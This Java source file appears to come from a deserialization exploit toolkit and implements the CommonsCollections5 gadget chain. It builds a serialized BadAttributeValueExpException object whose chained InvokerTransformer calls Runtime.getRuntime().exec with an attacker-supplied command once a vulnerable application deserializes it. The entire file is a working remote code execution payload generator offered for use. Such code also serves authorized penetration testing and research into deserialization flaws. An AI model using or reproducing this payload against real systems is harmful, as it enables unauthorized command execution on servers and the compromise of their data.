package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 implements ObjectPayload<Object> {
    @Override
    public BadAttributeValueExpException getObject(final String command) throws Exception {

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[]{}}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{}}),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{command})
        };

        final ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(1)
                }
        );

        final HashMap<Object, Object> innermap = new HashMap<>();
        final Map<Object, Object> LazyMapDecorate = LazyMap.decorate(innermap, chainedTransformer);

        final TiedMapEntry tiedMapEntry = new TiedMapEntry(LazyMapDecorate, "test");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Reflections.setFieldValueUnsafe(val, "val", tiedMapEntry);
        Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);

        return val;
    }
}